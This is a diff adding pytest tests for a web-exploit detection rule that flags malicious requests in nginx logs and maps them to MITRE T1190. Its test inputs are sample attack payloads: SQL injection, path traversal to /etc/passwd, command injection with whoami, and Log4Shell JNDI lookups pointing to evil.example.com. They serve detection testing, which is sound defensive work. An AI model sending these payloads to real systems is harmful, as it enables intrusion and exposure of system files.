@@ -514,3 +514,54 @@ class TestMitreMapping:
         ]
         for rid in approximate_rule_ids:
             assert rules[rid]["mitre_mapping_confidence"] == "approximate", f"{rid} should be approximate"
+
+
+class TestWebExploitDetection:
+    @pytest.fixture
+    def rules(self):
+        return load_rules(RULES_PATH)
+
+    def _alerts(self, path, rules, user_agent="Mozilla/5.0"):
+        ev = _nginx_event(path, "200", "203.0.113.99", user_agent=user_agent)
+        alerts = run_detections([ev], rules)
+        return [a for a in alerts if a.rule_id == "WEB_EXPLOIT_ATTEMPT"]
+
+    def test_sql_injection_encoded_is_detected(self, rules):
+        # URL-encoded "' OR '1'='1" — must be decoded before matching
+        web = self._alerts("/login?id=1%27%20OR%20%271%27%3D%271", rules)
+        assert len(web) == 1
+        assert "SQL Injection" in web[0].title
+
+    def test_union_select_is_detected(self, rules):
+        web = self._alerts("/users?id=1%20UNION%20SELECT%201,2,3--", rules)
+        assert len(web) == 1
+        assert "SQL Injection" in web[0].title
+
+    def test_path_traversal_is_detected(self, rules):
+        web = self._alerts("/download?file=../../../../etc/passwd", rules)
+        assert len(web) == 1
+        assert "Path Traversal" in web[0].title
+
+    def test_command_injection_is_detected(self, rules):
+        web = self._alerts("/ping?host=127.0.0.1;whoami", rules)
+        assert len(web) == 1
+        assert "Command Injection" in web[0].title
+
+    def test_log4shell_in_path_is_detected(self, rules):
+        web = self._alerts("/search?q=%24%7Bjndi:ldap://evil.example.com/a%7D", rules)
+        assert len(web) == 1
+        assert "Log4Shell" in web[0].title
+
+    def test_log4shell_in_user_agent_is_detected(self, rules):
+        web = self._alerts("/", rules, user_agent="${jndi:ldap://evil.example.com/x}")
+        assert len(web) == 1
+        assert "Log4Shell" in web[0].title
+
+    def test_benign_request_not_flagged(self, rules):
+        web = self._alerts("/products?id=42&sort=price", rules)
+        assert len(web) == 0
+
+    def test_mitre_technique_is_t1190(self, rules):
+        web = self._alerts("/download?file=../../etc/passwd", rules)
+        assert web[0].mitre_technique_id == "T1190"
+        assert rules["WEB_EXPLOIT_ATTEMPT"]["mitre_mapping_confidence"] == "direct"
